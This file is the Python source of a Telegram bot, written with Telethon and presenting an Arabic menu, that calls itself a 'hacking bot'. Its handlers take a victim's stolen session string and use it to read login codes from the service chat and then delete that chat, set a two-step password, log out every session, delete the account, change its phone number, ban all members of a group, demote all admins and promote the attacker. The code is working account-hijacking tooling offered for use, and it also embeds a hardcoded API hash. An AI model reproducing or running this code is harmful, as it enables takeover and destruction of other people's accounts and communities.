
import os
os.system("pip install Telethon==1.21.1")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('Jmthon', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

razan = 1657933680


async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('LEGENDXISBEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\n▾∮ اسم القنـاة {x.title} - معرف القنـاة @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "JMTHON"
menu = '''

A : [ ** تحقق منقنوات الحساب والمجموعات ⚡🧑‍💻 **]

B : [** اضهار معلومات الحساب ⚡🧑‍💻**]

C : [** تفليش مـجموعه ⚡🧑‍💻**]

D : [** اختراق حساب المستخدم⚡🧑‍💻 **]

E : [** اشتراك بقناة معينة⚡🧑‍💻** ]

F : [** مغادرة قناة معينة⚡🧑‍💻 **]

G : [** حذف قناة او مجموعة⚡🧑‍💻 **]

H : [** التحقق اذا كان التحقق بخطوتين مفعل ام لا⚡🧑‍💻 **]

I : [** تسجيل الخروج من جميع الجلسات⚡🧑‍💻 **]

J : [** حذف الحساب ⚡🧑‍💻**]

K : [** تنزيل كل المشرفين في قنا او كروب⚡🧑‍💻 **]

L : [** رفع مشرف في قنا او كروب⚡🧑‍💻 **]

M : [** تغيير رقم الهاتف⚡🧑‍💻  **]

** مميزات اكثر قريبا  **
BY ~ https://t.me/NBVKK
'''
mm = '''
** اهلا بك في بوت الاختراق  يمكنك اختراق اي شخص عبر كود تيرمكس

- اضغط على  /rz
**
'''
@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    await event.reply("⇜ ⌯⚡🧑‍💻 عذرا البوت يعمل في الخاص فقط")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == razan:
    return await event.reply("@NBVKK")
  async for x in client.iter_messages("@RYJJHW"):
    try:
      await x.forward_to("@RYJJHW")
    except:
      pass


@client.on(events.NewMessage(pattern="/rz", func=lambda x: x.is_group))
async def op(event):
  await event.reply("⇜ ⌯⚡🧑‍💻 عذرا البوت يعمل في الخاص فقط")
@client.on(events.NewMessage(pattern="/rz", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"⇜ ⌯⚡🧑‍💻 قـائمة اوامر البوت :\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "A":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\n⇜ ⌯⚡🧑‍💻 المعلومات بواسطه سورس دارك")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n⇜ ⌯⚡🧑‍💻 شكرا لاستخدام بوت دارك للاختراق")
    elif res.text == "B":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\n⇜ ⌯⚡🧑‍💻 شكرا لاستخدام بوت دارك للاختراق")
    elif r == "C":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا الان ارسل معرف القناة او المجموعة")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("⇜ ⌯⚡🧑‍💻 تم تفليش الكروب بنجاح ")
    elif r == "D":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\n⇜ ⌯⚡🧑‍💻 شكرا لاستخدام بوت دارك للاختراق")
    elif r == "E":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا الان ارسل معرف القناة او المجموعة")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("⇜ ⌯⚡🧑‍💻 تم الانضمام الى المجموعة او القناة بنجاح")
    elif r == "F":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا الان ارسل معرف القناة او المجموعة")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("⇜ ⌯⚡🧑‍💻 تمت المغادرة بنجاح ")
    elif r == "G":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا الان ارسل معرف القناة او المجموعة")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("⇜ ⌯⚡🧑‍💻 تم حذف القناه بنجاح ⚡🧑‍💻 \n\n⇜ ⌯⚡🧑‍💻 شكرا لاستخدام بوت دارك للاختراق")
    elif r == "H":
      await x.send_message("⇜ ⌯⚡🧑‍💻 ارسل كود تيرمكس ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      i = await user2fa(strses.text)
      if i:
        await event.reply("⇜ ⌯⚡🧑‍💻 هذا الشخص لم يقوم بوضع رمز تحقق بخطوتين يمكنك اختراقه بسهوله \n\n⇜ ⌯⚡🧑‍💻 شكرا لاستخدام بوت دارك للاختراق")
      else:
        await event.reply("⇜ ⌯⚡🧑‍💻 هذا الشخص مفعل رمز تحقق بخطوتين لا يمكن اختراقه لكن يمكنك حذف حسابه او استخدام اي امر اخر")
    elif r == "I":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      i = await terminate(strses.text)
      await event.reply("⇜ ⌯⚡🧑‍💻 تم انهاء جميع الجلسات بنجاح ⚡🧑‍💻 \n\n⇜ ⌯⚡🧑‍💻 شكرا لاستخدام بوت دارك للاختراق")
    elif res.text == "J":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
      i = await delacc(strses.text)
      await event.reply("⇜ ⌯⚡🧑‍💻 تم حذف هذا الحساب بنجاح ⚡🧑‍💻\n\n⇜ ⌯⚡🧑‍💻 شكرا لاستخدام بوت دارك للاختراق")
    elif res.text == "L":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("⇜ ⌯⚡🧑‍💻 الان ارسل معرف او رابط القناه او المجموعة")
      grp = await x.get_response()
      await x.send_message("⇜ ⌯⚡🧑‍💻 الان ارسل معرف المستخدم")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply(" ⇜ ⌯⚡🧑‍💻 تم رفعك مشرف بنجاح ⚡🧑‍💻\n\n شكرا لاستخدام بوت دارك للاختراق")
    elif res.text == "K":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("⇜ ⌯⚡🧑‍💻 الان ارسل معرف او رابط القناه او المجموعة")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("⇜ ⌯⚡🧑‍💻 يتم تنزيل جميع المشرفين تاكد بنفسك")
    elif res.text == "M":
      await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("⇜ ⌯⚡🧑‍💻 عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("⇜ ⌯⚡🧑‍💻 ارسل الرقم الذي تريد تكويل الحساب عليه \n⇜ ⌯⚡🧑‍💻 ملاحظة:  لا تستخدم رقم امريكي \n⇜ ⌯⚡🧑‍💻 اذا استخدمت رقم امريكي ما راح يوصلك كود تغيير الرقم")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("⇜ ⌯⚡🧑‍💻 حسنا الان ارسل")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("⇜ ⌯⚡🧑‍💻 ارسل الان كود التحقق")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("⇜ ⌯⚡🧑‍💻 تم تغيير رقم الهاتف بنجاح")
        else:
          await event.respond("هناك شي خطا")
      except Exception as e:
        await event.respond("اارسل هذا الخطأ الى @RYJJHW \n**الخطـأ**\n" + str(e))

    else:
      await event.respond("⇜ ⌯⚡🧑‍💻 استخدم /rz فقط")





client.run_until_disconnected()
